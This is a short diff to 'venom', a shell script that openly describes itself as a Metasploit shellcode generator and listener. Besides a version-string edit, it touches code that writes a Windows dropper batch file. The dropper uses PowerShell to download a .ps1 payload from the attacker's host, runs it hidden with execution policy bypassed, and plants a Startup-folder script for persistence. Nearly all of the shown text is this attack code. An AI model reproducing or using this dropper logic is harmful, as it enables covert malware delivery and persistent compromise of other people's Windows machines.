@@ -1,7 +1,7 @@
 #!/bin/sh
 # --------------------------------------------------------------
 # venom - metasploit Shellcode generator/compiler/listenner
-# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.0.16
+# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.0.16evas
 # Suspicious-Shell-Activity (SSA) RedTeam develop @2017 - 2019
 # codename: aconitum_nappelus [ GPL licensed ]
 # --------------------------------------------------------------
@@ -12375,7 +12375,7 @@ else
    echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
-   echo "echo PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Persiste.bat\"" >> $IPATH/output/$Drop.$ext.bat
+   echo "echo PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" \> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Persiste.bat\"" >> $IPATH/output/$Drop.$ext.bat
 fi
 
 
